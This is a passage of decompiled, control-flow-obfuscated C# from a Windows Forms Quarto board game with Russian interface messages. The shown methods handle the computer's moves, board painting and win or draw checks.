					continue;
				case 20u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -1656080392) ^ -779704000;
					continue;
				case 19u:
					num7 = 0;
					num = ((int)num2 * -1378698025) ^ -1524671269;
					continue;
				case 18u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 2056992830) ^ -1970749322;
					continue;
				case 17u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1839499788) ^ -1646171509;
					continue;
				case 16u:
					num3++;
					num = -491569296;
					continue;
				case 15u:
					num12 = Form1.smethod_38(e) / size;
					num13 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -1016449151) ^ -395299401;
					continue;
				case 14u:
					num8 = ((board[num13, num12] == null) ? 1 : 0);
					goto IL_0145;
				case 13u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num12 + 0.05f) * (float)size, ((float)num13 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -305230091) ^ 0x2925E1BE;
					continue;
				case 12u:
					Paint_Board();
					num = (int)((num2 * 1459734792) ^ 0x2E1330D1);
					continue;
				case 11u:
					num = ((int)num2 * -714551938) ^ -2046866523;
					continue;
				case 10u:
					num3 = 0;
					num = -491569296;
					continue;
				case 9u:
					num7++;
					num = ((int)num2 * -1292302853) ^ -1658932476;
					continue;
				case 8u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num3]), num12 * size + 4, num13 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -2116968776) ^ -1237494519;
					continue;
				case 7u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 1378917178;
						num10 = 1378917178;
					}
					else
					{
						num9 = 1964725572;
						num10 = 1964725572;
					}
					num = num9 ^ ((int)num2 * -2105523657);
					continue;
				}
				case 6u:
					num = (int)((num2 * 1947430013) ^ 0x72E4741B);
					continue;
				case 5u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -155526610) ^ 0x7BF70171;
						continue;
					}
					num8 = 0;
					goto IL_0145;
				case 4u:
					num = (int)((num2 * 1504588969) ^ 0x4BB3B966);
					continue;
				case 3u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1186654685) ^ 0x639BE459;
					continue;
				case 2u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = 200605593;
						num6 = 200605593;
					}
					else
					{
						num5 = 365319538;
						num6 = 365319538;
					}
					num = num5 ^ ((int)num2 * -1892748568);
					continue;
				}
				case 1u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = -2003183976;
						num4 = -2003183976;
					}
					else
					{
						num = -383522878;
						num4 = -383522878;
					}
					continue;
				}
				case 0u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -76956725) ^ -1537457740;
					continue;
				default:
					return;
				case 22u:
					break;
				case 24u:
					return;
					IL_0145:
					flag = (byte)num8 != 0;
					num = -1058921741;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0cfe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d2c: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		int num10 = default(int);
		bool flag10 = default(bool);
		int num9 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		bool flag8 = default(bool);
		int num25 = default(int);
		bool flag3 = default(bool);
		int num20 = default(int);
		int num18 = default(int);
		int num19 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		int num31 = default(int);
		int num16 = default(int);
		int num27 = default(int);
		int num48 = default(int);
		int num32 = default(int);
		bool flag4 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		int num33 = default(int);
		Graphics graphics_ = default(Graphics);
		int num30 = default(int);
		bool flag5 = default(bool);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag12 = default(bool);
		int num17 = default(int);
		Figurine[,] array2 = default(Figurine[,]);
		int num29 = default(int);
		bool flag7 = default(bool);
		int num14 = default(int);
		bool flag11 = default(bool);
		bool flag6 = default(bool);
		int num15 = default(int);
		bool flag9 = default(bool);
		while (true)
		{
			int num = -1668803250;
			while (true)
			{
				uint num2;
				int num37;
				int num44;
				int num34;
				int num26;
				switch ((num2 = (uint)num ^ 0xA865C53Eu) % 170u)
				{
				case 169u:
					num = -201749660;
					continue;
				case 168u:
					num = (int)((num2 * 605678371) ^ 0x4DC22E43);
					continue;
				case 167u:
					num10 = Form1.smethod_33(rnd, 4);
					flag10 = board[num9, num10] != null;
					num = (int)(num2 * 1309583809) ^ -2097995667;
					continue;
				case 166u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1673469145) ^ -1753942756;
					continue;
				case 165u:
					num = (int)(num2 * 1664936023) ^ -1938938414;
					continue;
				case 164u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = (int)((num2 * 1241354681) ^ 0x117A4A);
					continue;
				case 163u:
				{
					int num38;
					int num39;
					if (flag8)
					{
						num38 = -1995273884;
						num39 = -1995273884;
					}
					else
					{
						num38 = -1361195266;
						num39 = -1361195266;
					}
					num = num38 ^ (int)(num2 * 21292537);
					continue;
				}
				case 162u:
					num = ((int)num2 * -1042184170) ^ -1685545737;
					continue;
				case 161u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -1332254694;
					continue;
				case 160u:
					num25++;
					num = -1428756945;
					continue;
				case 159u:
					num = ((int)num2 * -891761302) ^ 0x7D2889B3;
					continue;
				case 158u:
					num = ((int)num2 * -289474785) ^ 0x3F91CA8E;
					continue;
				case 157u:
					flag3 = num20 < 4;
					num = -763389160;
					continue;
				case 156u:
					num18 = Form1.smethod_33(rnd, 4);
					num19 = Form1.smethod_33(rnd, 4);
					num = -1711711286;
					continue;
				case 155u:
					num = ((int)num2 * -1265104045) ^ 0x3D6F2D6;
					continue;
				case 154u:
					num = -1391918227;
					continue;
				case 152u:
					Form1.smethod_20(pictureBox[num11, num12], (Image)null);
					num = ((int)num2 * -1045647947) ^ -897582973;
					continue;
				case 151u:
					num12 = 0;
					num31 = 0;
					num = (int)(num2 * 1533277376) ^ -1459899501;
					continue;
				case 150u:
					num16 = num3;
					num = (int)((num2 * 890995678) ^ 0x2F972D70);
					continue;
				case 149u:
					num27 = 0;
					num = (int)((num2 * 1636636204) ^ 0x4F5EEC14);
					continue;
				case 148u:
					Form1.smethod_5((Control)(object)borderBox[num18, num19], Color.Blue);
					num = (int)((num2 * 1624567015) ^ 0x31DAEAC8);
					continue;
				case 147u:
					num = (int)(num2 * 1053923754) ^ -815879402;
					continue;
				case 146u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1288328982) ^ -702647130;
					continue;
				case 145u:
					num = (int)(num2 * 647999476) ^ -944892810;
					continue;
				case 144u:
					num = (int)((num2 * 265952298) ^ 0x685D9BD9);
					continue;
				case 143u:
					num48 = 0;
					num = -2076261211;
					continue;
				case 142u:
					num = ((int)num2 * -791467443) ^ 0x40EA59BC;
					continue;
				case 141u:
					if (num18 == num11)
					{
						num = (int)(num2 * 1335760360) ^ -2065886045;
						continue;
					}
					goto IL_02eb;
				case 140u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 791448383) ^ 0x11835797);
					continue;
				case 139u:
					num32++;
					num = ((int)num2 * -330505201) ^ 0x1A718B10;
					continue;
				case 138u:
					Form1.smethod_30((Control)(object)borderBox[num11, num12]);
					num = (int)(num2 * 1996119668) ^ -1273715133;
					continue;
				case 137u:
					flag4 = num27 < 4;
					num = -512981082;
					continue;
				case 136u:
					num = ((int)num2 * -387349322) ^ -1495479031;
					continue;
				case 135u:
				{
					int num45;
					if (num31 < 4)
					{
						num = -246194235;
						num45 = -246194235;
					}
					else
					{
						num = -434193678;
						num45 = -434193678;
					}
					continue;
				}
				case 134u:
				{
					Figurine[,] array3 = (Figurine[,])Form1.smethod_48((Array)array);
					array3[num27, num25] = new Figurine(storage[num18, num19]);
					int num40;
					int num41;
					if (!Stop(array3))
					{
						num40 = 668493179;
						num41 = 668493179;
					}
					else
					{
						num40 = 1463558935;
						num41 = 1463558935;
					}
					num = num40 ^ ((int)num2 * -2015767241);
					continue;
				}
				case 133u:
					if (num33 >= 9)
					{
						num = -1538637711;
						num37 = -1538637711;
						continue;
					}
					goto IL_0415;
				case 132u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num30 = 0;
					num = (int)((num2 * 1560549945) ^ 0x1CA40B40);
					continue;
				case 131u:
					flag5 = true;
					num = (int)((num2 * 389488044) ^ 0x45B30B0F);
					continue;
				case 130u:
				{
					int num23;
					int num24;
					if (flag4)
					{
						num23 = 354224079;
						num24 = 354224079;
					}
					else
					{
						num23 = 1736538671;
						num24 = 1736538671;
					}
					num = num23 ^ ((int)num2 * -1210757464);
					continue;
				}
				case 129u:
					num = ((int)num2 * -1237897104) ^ -1814681597;
					continue;
				case 128u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = 2083577101;
						num8 = 2083577101;
					}
					else
					{
						num7 = 508830674;
						num8 = 508830674;
					}
					num = num7 ^ (int)(num2 * 267115012);
					continue;
				}
				case 127u:
					num = ((int)num2 * -21064701) ^ 0x2D879274;
					continue;
				case 126u:
					flag = Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue;
					num = ((int)num2 * -667484597) ^ 0x3A8C2141;
					continue;
				case 125u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1384869234) ^ -877435373;
					continue;
				case 124u:
					Form1.smethod_5((Control)(object)borderBox[num31, num32], Color.LimeGreen);
					num = (int)(num2 * 538616966) ^ -234014639;
					continue;
				case 123u:
					num32 = 0;
					num = -1905868708;
					continue;
				case 122u:
					if (!Stop(board))
					{
						num = (int)((num2 * 605450942) ^ 0x16E30BFB);
						continue;
					}
					goto IL_0594;
				case 121u:
					num = (int)(num2 * 150279231) ^ -1752492878;
					continue;
				case 120u:
					num = -1095430739;
					continue;
				case 119u:
					num = (int)(num2 * 1793581538) ^ -1617625986;
					continue;
				case 118u:
					num = -161133822;
					continue;
				case 117u:
				{
					int num59;
					int num60;
					if (flag12)
					{
						num59 = 917120685;
						num60 = 917120685;
					}
					else
					{
						num59 = 611861885;
						num60 = 611861885;
					}
					num = num59 ^ (int)(num2 * 1324136557);
					continue;
				}
				case 116u:
					storage[num16, num17] = null;
					Paint_Board();
					num = (int)((num2 * 287673548) ^ 0xAE338D3);
					continue;
				case 115u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)((num2 * 1097833241) ^ 0x5EF741B9);
					continue;
				case 114u:
					array2[num30, num29] = new Figurine(storage[num11, num12]);
					num = (int)(num2 * 1710336653) ^ -895707287;
					continue;
				case 113u:
					num = -1056496442;
					continue;
				case 112u:
					flag2 = board[num30, num29] == null;
					num = -1120455402;
					continue;
				case 111u:
					num = (int)((num2 * 308521889) ^ 0x2B5C4EBF);
					continue;
				case 110u:
				{
					int num57;
					int num58;
					if (!flag3)
					{
						num57 = -1278190264;
						num58 = -1278190264;
					}
					else
					{
						num57 = -400788149;
						num58 = -400788149;
					}
					num = num57 ^ ((int)num2 * -415442687);
					continue;
				}
				case 109u:
					num4++;
					num = -792402048;
					continue;
				case 108u:
					num = (int)((num2 * 1862009049) ^ 0x7997321);
					continue;
				case 107u:
				{
					int num56;
					if (num30 >= 4)
					{
						num = -2074564173;
						num56 = -2074564173;
					}
					else
					{
						num = -651382130;
						num56 = -651382130;
					}
					continue;
				}
				case 106u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 503727061) ^ -1809692491;
					continue;
				case 105u:
					num = (int)(num2 * 419939708) ^ -981267114;
					continue;
				case 104u:
					num31++;
					num = (int)(num2 * 1232949454) ^ -916652637;
					continue;
				case 103u:
					flag7 = Standoff(board);
					num = (int)((num2 * 133607292) ^ 0x760145C2);
					continue;
				case 102u:
					num = ((int)num2 * -550519092) ^ -1378382299;
					continue;
				case 101u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num10 + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num11, num12]), num10 * size + 4, num9 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1358745244) ^ -43664296;
					continue;
				case 100u:
					num27++;
					num = (int)((num2 * 1695276914) ^ 0x6ED2EBF5);
					continue;
				case 99u:
					num33 = 0;
					num = ((int)num2 * -357893068) ^ -791756097;
					continue;
				case 98u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num11, num12], Color.White);
					num = (int)(num2 * 2132334483) ^ -1884082215;
					continue;
				case 97u:
					num = ((int)num2 * -1211451481) ^ -63950398;
					continue;
				case 96u:
					num14 = 0;
					num = (int)(num2 * 663657442) ^ -2063556617;
					continue;
				case 95u:
					num = (int)((num2 * 470834282) ^ 0x699047FA);
					continue;
				case 94u:
					board[num30, num29] = new Figurine(storage[num11, num12]);
					storage[num11, num12] = null;
					num = ((int)num2 * -1110130366) ^ 0x54961749;
					continue;
				case 93u:
					num14 = num3;
					num = ((int)num2 * -1583302018) ^ 0x2F415A20;
					continue;
				case 92u:
					num = ((int)num2 * -845116765) ^ 0x639E7192;
					continue;
				case 91u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 1398435242) ^ 0x624918ED);
					continue;
				case 90u:
					num17 = num4;
					num = (int)(num2 * 1882319527) ^ -477928018;
					continue;
				case 89u:
					Form1.smethod_30((Control)(object)borderBox[num31, num32]);
					num = (int)(num2 * 765698359) ^ -961410040;
					continue;
				case 88u:
					num = ((int)num2 * -709779992) ^ -247099666;
					continue;
				case 87u:
				{
					int num54;
					int num55;
					if (flag11)
					{
						num54 = -1233476980;
						num55 = -1233476980;
					}
					else
					{
						num54 = -1595198186;
						num55 = -1595198186;
					}
					num = num54 ^ (int)(num2 * 1208310003);
					continue;
				}
				case 86u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)((num2 * 530439042) ^ 0x3D866700);
					continue;
				case 85u:
					num = (int)((num2 * 2077735831) ^ 0x473860B9);
					continue;
				case 83u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 2130908953) ^ -1054477751;
					continue;
				case 82u:
				{
					int num53;
					if (num29 >= 4)
					{
						num = -67055274;
						num53 = -67055274;
					}
					else
					{
						num = -962385764;
						num53 = -962385764;
					}
					continue;
				}
				case 81u:
				{
					int num51;
					int num52;
					if (flag6)
					{
						num51 = -2068164189;
						num52 = -2068164189;
					}
					else
					{
						num51 = -2003266273;
						num52 = -2003266273;
					}
					num = num51 ^ (int)(num2 * 1075893325);
					continue;
				}
				case 80u:
				{
					int num50;
					if (num4 < 4)
					{
						num = -522638616;
						num50 = -522638616;
					}
					else
					{
						num = -1904605727;
						num50 = -1904605727;
					}
					continue;
				}
				case 79u:
					storage[num11, num12] = null;
					num = ((int)num2 * -1840405428) ^ 0x7D062388;
					continue;
				case 78u:
					num = ((int)num2 * -604846870) ^ -162428879;
					continue;
				case 77u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 727579067) ^ -1980461968;
					continue;
				case 76u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 1676221152) ^ -145630689;
					continue;
				case 75u:
					Form1.smethod_15(timer1);
					num = (int)((num2 * 1616568892) ^ 0x3334A6C0);
					continue;
				case 74u:
					num15 = num4;
					num = (int)((num2 * 1748745267) ^ 0x184AC0A3);
					continue;
				case 73u:
					num48++;
					num = (int)(num2 * 1244472485) ^ -1178704810;
					continue;
				case 72u:
					num = ((int)num2 * -2077570496) ^ 0x33B8CEDF;
					continue;
				case 71u:
					Form1.smethod_7((Control)(object)pictureBox[num20, num48], bool_0: true);
					num = -1823260235;
					continue;
				case 70u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -732909958) ^ -750316002;
					continue;
				case 69u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = ((int)num2 * -1738340195) ^ -417064725;
					continue;
				case 68u:
					num = -1077808529;
					continue;
				case 67u:
					num29++;
					num = -2098973644;
					continue;
				case 66u:
					num = (int)((num2 * 345199212) ^ 0x337B8964);
					continue;
				case 65u:
					flag5 = false;
					num = (int)((num2 * 1921892918) ^ 0x73EB3771);
					continue;
				case 64u:
					Form1.smethod_7((Control)(object)pictureBox[num31, num32], bool_0: false);
					flag12 = Form1.smethod_41((Control)(object)borderBox[num31, num32]) == Color.Red;
					num = -1397923179;
					continue;
				case 63u:
					flag9 = num25 < 4;
					num = -623959057;
					continue;
				case 62u:
					num = (int)(num2 * 1987580345) ^ -46686645;
					continue;
				case 61u:
					num = (int)((num2 * 1350239029) ^ 0x3482684C);
					continue;
				case 60u:
					num = ((int)num2 * -194502504) ^ 0x5D618F24;
					continue;
				case 59u:
					num3++;
					num = ((int)num2 * -85807010) ^ 0x6E2307CA;
					continue;
				case 58u:
					flag8 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num4 * size + size / 2, (int)(((float)num3 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = -870323243;
					continue;
				case 57u:
				{
					int num49;
					if (num32 < 4)
					{
						num = -505025588;
						num49 = -505025588;
					}
					else
					{
						num = -1506745674;
						num49 = -1506745674;
					}
					continue;
				}
				case 56u:
					num29 = 0;
					num = -2098973644;
					continue;
				case 55u:
					num16 = 0;
					num = ((int)num2 * -1712407782) ^ 0x4C8D62DD;
					continue;
				case 54u:
					num30++;
					num = ((int)num2 * -624457943) ^ -732424203;
					continue;
				case 53u:
					num = (int)(num2 * 275506339) ^ -205386271;
					continue;
				case 52u:
					num = ((int)num2 * -440369303) ^ -2029490372;
					continue;
				case 51u:
					num = (int)(num2 * 1447292860) ^ -1801604768;
					continue;
				case 50u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = -1495419643;
					continue;
				case 49u:
					num = (int)((num2 * 1038607341) ^ 0x1EC237F7);
					continue;
				case 48u:
					Form1.smethod_20(pictureBox[num11, num12], (Image)null);
					num = (int)((num2 * 1634580383) ^ 0x4DC638D9);
					continue;
				case 47u:
					flag11 = num48 < 4;
					num = -1654665149;
					continue;
				case 46u:
				{
					int num46;
					int num47;
					if (flag10)
					{
						num46 = 596025551;
						num47 = 596025551;
					}
					else
					{
						num46 = 1802315918;
						num47 = 1802315918;
					}
					num = num46 ^ ((int)num2 * -788091023);
					continue;
				}
				case 45u:
					if (!Standoff(board))
					{
						num = -243573251;
						num44 = -243573251;
						continue;
					}
					goto IL_0594;
				case 44u:
					num = (int)(num2 * 1635040552) ^ -424830118;
					continue;
				case 43u:
				{
					int num42;
					int num43;
					if (flag9)
					{
						num42 = -223470985;
						num43 = -223470985;
					}
					else
					{
						num42 = -1204601376;
						num43 = -1204601376;
					}
					num = num42 ^ (int)(num2 * 795541306);
					continue;
				}
				case 42u:
					if (!flag5)
					{
						num = ((int)num2 * -1135798117) ^ -579599641;
						continue;
					}
					goto IL_0415;
				case 41u:
					num20 = 0;
					num = ((int)num2 * -975779474) ^ -1165146473;
					continue;
				case 40u:
				{
					int num35;
					int num36;
					if (flag7)
					{
						num35 = -1362029366;
						num36 = -1362029366;
					}
					else
					{
						num35 = -1025078203;
						num36 = -1025078203;
					}
					num = num35 ^ (int)(num2 * 212879650);
					continue;
				}
				case 39u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 440638541) ^ -2126420360;
					continue;
				case 38u:
					num = -45251997;
					continue;
				case 37u:
					if (!Standoff(array2))
					{
						num = -1509177446;
						num34 = -1509177446;
						continue;
					}
					goto IL_0f8c;
				case 36u:
					flag6 = num3 < 4;
					num = -634238051;
					continue;
				case 35u:
					num20++;
					num = (int)(num2 * 382981285) ^ -1629946088;
					continue;
				case 34u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					array[num9, num10] = new Figurine(storage[num11, num12]);
					num = ((int)num2 * -1685701299) ^ 0x46BACF89;
					continue;
				case 33u:
					num17 = 0;
					num = ((int)num2 * -1296459243) ^ -863967807;
					continue;
				case 32u:
					num3 = 0;
					num = ((int)num2 * -1169486912) ^ -1993781336;
					continue;
				case 31u:
					num33++;
					num = -1534671925;
					continue;
				case 30u:
					num4 = 0;
					num = -792402048;
					continue;
				case 29u:
					num = (int)(num2 * 1503045994) ^ -305297106;
					continue;
				case 28u:
					num11 = 0;
					num = ((int)num2 * -1175029414) ^ 0x51A70DBD;
					continue;
				case 27u:
					num15 = 0;
					num = (int)(num2 * 1034589460) ^ -207444000;
					continue;
				case 26u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -789676855) ^ 0x245E4DA2;
					continue;
				case 25u:
					Form1.smethod_30((Control)(object)pictureBox[num11, num12]);
					num = ((int)num2 * -128967862) ^ 0x6106058A;
					continue;
				case 24u:
					num = (int)((num2 * 2008148887) ^ 0x5597C735);
					continue;
				case 23u:
					if (!Stop(array2))
					{
						num = ((int)num2 * -404769349) ^ 0x3B05D198;
						continue;
					}
					goto IL_0f8c;
				case 22u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -1253864742) ^ -2067101417;
					continue;
				case 21u:
					num11 = num31;
					num12 = num32;
					num = (int)(num2 * 2124401231) ^ -1429328885;
					continue;
				case 20u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num29 + 0.05f) * (float)size, ((float)num30 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num11, num12]), num29 * size + 4, num30 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -627878894) ^ -1698154461;
					continue;
				case 19u:
				{
					int num28;
					if (array[num27, num25] == null)
					{
						num = -40462940;
						num28 = -40462940;
					}
					else
					{
						num = -201749660;
						num28 = -201749660;
					}
					continue;
				}
				case 18u:
					Form1.smethod_30((Control)(object)borderBox[num18, num19]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)(num2 * 268601734) ^ -335918469;
					continue;
				case 17u:
					if (num19 != num12)
					{
						goto IL_02eb;
					}
					goto IL_02f7;
				case 16u:
					num = (int)(num2 * 831295199) ^ -844973907;
					continue;
				case 15u:
					num25 = 0;
					num = -1875068742;
					continue;
				case 14u:
				{
					int num21;
					int num22;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num21 = 1825273647;
						num22 = 1825273647;
					}
					else
					{
						num21 = 515212574;
						num22 = 515212574;
					}
					num = num21 ^ ((int)num2 * -1915470061);
					continue;
				}
				case 13u:
					num = (int)(num2 * 379251511) ^ -1629528593;
					continue;
				case 12u:
					if (storage[num18, num19] != null)
					{
						num = ((int)num2 * -1401665261) ^ -659660363;
						continue;
					}
					goto IL_02f7;
				case 11u:
					Form1.smethod_5((Control)(object)borderBox[num11, num12], Color.White);
					num = ((int)num2 * -1582685078) ^ -1591841388;
					continue;
				case 10u:
					Form1.smethod_30((Control)(object)borderBox[num11, num12]);
					num = ((int)num2 * -2107188033) ^ 0x3824202A;
					continue;
				case 9u:
					num9 = Form1.smethod_33(rnd, 4);
					num = -131938243;
					continue;
				case 8u:
					board[num14, num15] = new Figurine(storage[num16, num17]);
					num = ((int)num2 * -824492415) ^ -1697131176;
					continue;
				case 7u:
					Form1.smethod_30((Control)(object)pictureBox[num11, num12]);
					num = ((int)num2 * -2139060393) ^ 0x7DD050EE;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 2055787062) ^ 0x3C3FC0DD);
					continue;
				case 5u:
					num = ((int)num2 * -1499427265) ^ 0x5529B9D;
					continue;
				case 4u:
				{
					int num13;
					if (Standoff(board))
					{
						num = -1736137964;
						num13 = -1736137964;
					}
					else
					{
						num = -1896226088;
						num13 = -1896226088;
					}
					continue;
				}
				case 3u:
					board[num9, num10] = new Figurine(storage[num11, num12]);
					num = ((int)num2 * -1768305513) ^ 0x265DCCE8;
					continue;
				case 2u:
					num = ((int)num2 * -539655842) ^ -1665141074;
					continue;
				case 1u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = 1369970972;
						num6 = 1369970972;
					}
					else
					{
						num5 = 1956919554;
						num6 = 1956919554;
					}
					num = num5 ^ (int)(num2 * 489672278);
					continue;
				}
				case 0u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)(num2 * 136676036) ^ -751294816;
					continue;
				default:
					return;
				case 84u:
					break;
				case 153u:
					return;
					IL_02f7:
					num = -1994744162;
					num26 = -1994744162;
					continue;
					IL_0f8c:
					num = -1631750545;
					num34 = -1631750545;
					continue;
					IL_0415:
					num = -1170728421;
					num37 = -1170728421;
					continue;
					IL_02eb:
					num = -322954438;
					num26 = -322954438;
					continue;
					IL_0594:
					num = -485148866;
					num44 = -485148866;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		bool flag4 = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 832607439;
			while (true)
			{
				uint num2;
				int num19;
				int num28;
				switch ((num2 = (uint)num ^ 0x407744DEu) % 78u)
				{
				case 77u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)(num2 * 595361534) ^ -1661865646;
						continue;
					}
					goto IL_0035;
				case 76u:
				{
					int num4;
					int num5;
					if (mem[1, 1] == null)
					{
						num4 = 155143591;
						num5 = 155143591;
					}
					else
					{
						num4 = 483436973;
						num5 = 483436973;
					}
					num = num4 ^ ((int)num2 * -853498075);
					continue;
				}
				case 75u:
				{
					int num47;
					int num48;
					if (!flag3)
					{
						num47 = -1596424943;
						num48 = -1596424943;
					}
					else
					{
						num47 = -406074474;
						num48 = -406074474;
					}
					num = num47 ^ ((int)num2 * -1977026995);
					continue;
				}
				case 74u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 681882662) ^ 0x250422D5);
						continue;
					}
					goto IL_00b6;
				case 73u:
					flag = false;
					num3 = 0;
					num = (int)((num2 * 80976822) ^ 0x3BC0D8F5);
					continue;
				case 72u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = ((int)num2 * -686590384) ^ -1102009399;
						continue;
					}
					goto IL_0035;
				case 71u:
				{
					int num36;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 1587195802;
						num36 = 1587195802;
					}
					else
					{
						num = 1812159846;
						num36 = 1812159846;
					}
					continue;
				}
				case 70u:
				{
					int num13;
					int num14;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num13 = 1521866853;
						num14 = 1521866853;
					}
					else
					{
						num13 = 1713117534;
						num14 = 1713117534;
					}
					num = num13 ^ (int)(num2 * 646681315);
					continue;
				}
				case 69u:
				{
					int num67;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 1772991429;
						num67 = 1772991429;
					}
					else
					{
						num = 1040307531;
						num67 = 1040307531;
					}
					continue;
				}
				case 68u:
				{
					int num57;
					int num58;
					if (mem[num3, 2] != null)
					{
						num57 = -214541156;
						num58 = -214541156;
					}
					else
					{
						num57 = -1050464284;
						num58 = -1050464284;
					}
					num = num57 ^ ((int)num2 * -1817147710);
					continue;
				}
				case 67u:
					flag = true;
					num = ((int)num2 * -1224562286) ^ 0x287F4B32;
					continue;
				case 66u:
				{
					int num42;
					if (mem[num3, 0].Point != mem[num3, 1].Point)
					{
						num = 1093749046;
						num42 = 1093749046;
					}
					else
					{
						num = 678980273;
						num42 = 678980273;
					}
					continue;
				}
				case 65u:
				{
					int num31;
					int num32;
					if (flag4)
					{
						num31 = 1533945019;
						num32 = 1533945019;
					}
					else
					{
						num31 = 415885984;
						num32 = 415885984;
					}
					num = num31 ^ ((int)num2 * -711367384);
					continue;
				}
				case 64u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = ((int)num2 * -1501983042) ^ -237434378;
						continue;
					}
					goto IL_0290;
				case 63u:
				{
					int num9;
					int num10;
					if (mem[num3, 1].Point != mem[num3, 2].Point)
					{
						num9 = -2118497882;
						num10 = -2118497882;
					}
					else
					{
						num9 = -433856530;
						num10 = -433856530;
					}
					num = num9 ^ ((int)num2 * -1394847632);
					continue;
				}
				case 62u:
				{
					int num63;
					int num64;
					if (mem[1, num3].Big != mem[2, num3].Big)
					{
						num63 = -815790539;
						num64 = -815790539;
					}
					else
					{
						num63 = -820145282;
						num64 = -820145282;
					}
					num = num63 ^ (int)(num2 * 573786194);
					continue;
				}
				case 61u:
				{
					int num54;
					int num55;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num54 = -1131305477;
						num55 = -1131305477;
					}
					else
					{
						num54 = -665376064;
						num55 = -665376064;
					}
					num = num54 ^ ((int)num2 * -1989139716);
